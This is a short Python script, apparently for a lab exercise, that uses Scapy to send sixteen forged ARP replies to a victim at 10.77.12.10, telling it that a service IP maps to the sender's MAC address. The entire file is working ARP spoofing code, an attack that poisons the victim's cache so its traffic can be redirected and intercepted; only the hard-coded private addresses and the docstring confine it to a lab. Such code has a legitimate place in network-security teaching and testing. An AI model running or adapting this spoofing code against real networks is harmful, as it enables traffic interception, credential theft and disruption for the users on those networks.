"""Bounded forged ARP reply, addressed only to this disposable lab victim."""
from scapy.all import ARP, Ether, get_if_hwaddr, getmacbyip, sendp

victim_ip = "10.77.12.10"
service_ip = "10.77.12.20"
iface = "eth0"
victim_mac = getmacbyip(victim_ip)
if not victim_mac:
    raise SystemExit("Victim MAC unavailable; start the lab and retry")
attacker_mac = get_if_hwaddr(iface)
packet = Ether(src=attacker_mac, dst=victim_mac) / ARP(
    op=2, psrc=service_ip, pdst=victim_ip,
    hwsrc=attacker_mac, hwdst=victim_mac,
)
sendp(packet, iface=iface, count=16, inter=0.25, verbose=False)
print(f"Sent 16 bounded forged replies: {service_ip} is-at {attacker_mac} to {victim_ip}")
